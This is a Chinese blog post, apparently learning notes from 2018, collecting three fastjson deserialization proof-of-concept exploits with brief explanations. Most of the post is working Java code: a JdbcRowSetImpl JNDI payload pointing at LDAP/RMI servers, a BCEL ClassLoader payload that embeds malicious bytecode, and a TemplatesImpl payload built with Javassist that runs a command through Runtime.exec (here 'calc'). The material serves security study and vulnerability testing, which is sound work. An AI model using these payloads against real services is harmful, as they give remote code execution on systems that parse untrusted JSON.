Title: Java反序列化漏洞学习实践七：fastjson反序列化PoC汇总
Date: 2018-11-26 18:04
Category: 漏洞实践
Tags: Java,反序列化,漏洞
Slug: 
Authors: bit4
Summary: 

### **0x0、说明**

本文是个人学习的记录总结，如有错误烦请[指出](https://github.com/bit4woo/code2sec.com/issues)，谢谢！



本文主要汇总大佬们的fastjson的各种PoC，并进行简单的说明，目的是梳理一下利用思路。

通过对Java反序列化知识的学习，可以大致知道命令执行链由至少2部分组成：

1. 具有代码执行能力的类，我们之前的文章【或[GitHub](https://github.com/bit4woo/code2sec.com/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E5%85%AD%EF%BC%9A%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%92%8C%E6%81%B6%E6%84%8F%E7%B1%BB%E6%9E%84%E9%80%A0.md)】就是为了弄清楚这部分内容；
2. 能够触发代码执行的触发器（即特定的调用代码），比如恶意类EvilClass中，它的静态代码块，构造函数，自定义函数，实现的接口函数都能执行代码，但是他们的触发点各不相同。

静态代码会在类的初始化时触发--Class.forName()

构造函数会在类实例化时触发--newInstance()， new Evil()

自定义函数则在函数调用时触发---m.invoke(Class,para)



再比如，fastjson中漏洞可以利用Class.forName()，而Jackson的漏洞中，触发点则需要newInstance()。

### 0x1、基于com.sun.rowset.JdbcRowSetImpl的PoC1

该PoC需要使用JNDI，需要搭建web服务，RMI服务或LDAP服务，利用相对麻烦。但对于检测fastjson漏洞是否存在，这个却是最简单有效的（结合DNSlog）。利用这个方法，已经成功在公司业务和SRC中发现了接近20个漏洞。



```java
package fastjsonPoCs;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

/*
 * 基于JNDI的PoC,可用的JNDI服务器有RMI，ldap。
 * 
 */
public class PoC1JNDI {
	public static void main(String[] argv){
		String xx = payload();
	}
	
	public static String payload(){

		//JDK 8u121以后版本需要设置改系统变量
		System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
		//LADP
		String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}";
		//RMI
		String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ref\",\"autoCommit\":true}";

		JSONObject.parseObject(payload2);
		JSON.parse(payload2);
		return payload2;
	}
}

```

以上poc共有三个触发点：静态代码块(Class.forName())、类实例化、和getObjectInstance()方法。



### 0x2、基于com.sun.org.apache.bcel.internal.util.ClassLoader的PoC2

这个PoC是漏洞利用时最方便的，它不需要依赖JNDI等服务，所有内容一个请求中搞定。

```java
package fastjsonPoCs;

import evilClass.*;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.bcel.internal.classfile.Utility;

/*
 * 基于org.apache.tomcat.dbcp.dbcp.BasicDataSource的PoC，当然也可以说是基于com.sun.org.apache.bcel.internal.util.ClassLoader的PoC
 * 前者的主要作用是触发，也就是包含Class.forName()函数的逻辑(createConnectionFactory函数中)；后者是类加载器，可以解析特定格式的类byte[]。
 * 
 * 
 * org.apache.tomcat.dbcp.dbcp.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp 比如tomcat-dbcp-7.0.65.jar
 * org.apache.tomcat.dbcp.dbcp2.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp 比如tomcat-dbcp-9.0.13.jar
 * org.apache.commons.dbcp.BasicDataSource ----- https://mvnrepository.com/artifact/commons-dbcp/commons-dbcp
 * org.apache.commons.dbcp2.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.commons/commons-dbcp2
 * 
 * 主要参考：https://xz.aliyun.com/t/2272
 */
public class PoC2dbcp {
	public static void main(String[] argv){
		String xx = payload2();
	}
	
	public static String payload2() {
		//payload3:https://xz.aliyun.com/t/2272
		try {
			String payload2 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
//			payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
//			payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
//			payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
			byte[] bytecode = createEvilClass.create("evil","calc");
			String classname = Utility.encode(bytecode,true);
			//System.out.println(classname);
			classname = "org.apache.log4j.spi$$BCEL$$"+classname;
			payload2 = payload2.replace("xxxxxxxxxx", classname);
			
//			ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();
//			Class.forName(classname, true, cls);
			JSONObject.parseObject(payload2);
			return payload2;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}
}
```



### 0x3、基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl的PoC3(来自廖新喜)



这个PoC有限制，需要引用程序是如下写法：

```
JSON.parseObject(payload3, Object.class, config, Feature.SupportNonPublicField)
```

在实际的环境中基本遇不到，但其中的思路还是值得学习的。

```java
package fastjsonPoCs;

import org.apache.commons.codec.binary.Base64;
import javassist.ClassPool;
import javassist.CtClass;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/*
 * 该poc来自于廖新喜大佬的文章：http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
 * 基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，构造的恶意类需要是继承了AbstractTranslet的。
 */
public class PoC3TemplatesImpl {
	public static void main(String[] argv){
		String xx = payload3();
	}
	
	public static String payload3() {
		try {
			//http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
			String payload3 = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"xxxxxxxxxx\"], \"_name\": \"1111\", \"_tfactory\": { }, \"_outputProperties\":{ }}";
			byte[] bytecode1 = Gadget.createEvilBytecode("calc");
			String className = TemplatesImpl.class.getName();//com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
			payload3 = payload3.replace("xxxxxxxxxx", Base64.encodeBase64String(bytecode1));
			
			System.out.println(payload3);
			ParserConfig config = new ParserConfig();
			Object obj = JSON.parseObject(payload3, Object.class, config, Feature.SupportNonPublicField);
			
			return payload3;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}
}


class Gadget {

    public static class evil extends AbstractTranslet{
    	@Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }
    }

    static byte[] createEvilBytecode(final String command) throws Exception {
        ClassPool classPool = ClassPool.getDefault();

        // 获取class
        System.out.println("ClassName: " + evil.class.getName());
        final CtClass clazz = classPool.get(evil.class.getName());

        // 插入静态代码块，在代码末尾。
        clazz.makeClassInitializer().insertAfter(
                "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");"
        );
        clazz.setName("evilxxx");//类的名称，可以通过它修改。
        
        clazz.writeFile("D:\\");//将生成的.class文件保存到磁盘
        // 获取bytecodes
        final byte[] classBytes = clazz.toBytecode();
        return classBytes;
    }
}

```



### 0x4、参考

[技术专栏 | 深入理解JNDI注入与Java反序列化漏洞利用](https://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&mid=2651198215&idx=1&sn=929dd320ac2b17682e6c7d3f163f6985&chksm=bd2cf6a18a5b7fb758e4000c253adba90de67f72527ae1525a1d6722a09a85a06c8d800a08a7&scene=0#rd)

[defineClass在java反序列化当中的利用](https://xz.aliyun.com/t/2272)

[秒懂Java动态编程（Javassist研究）](https://blog.csdn.net/ShuSheng0007/article/details/81269295)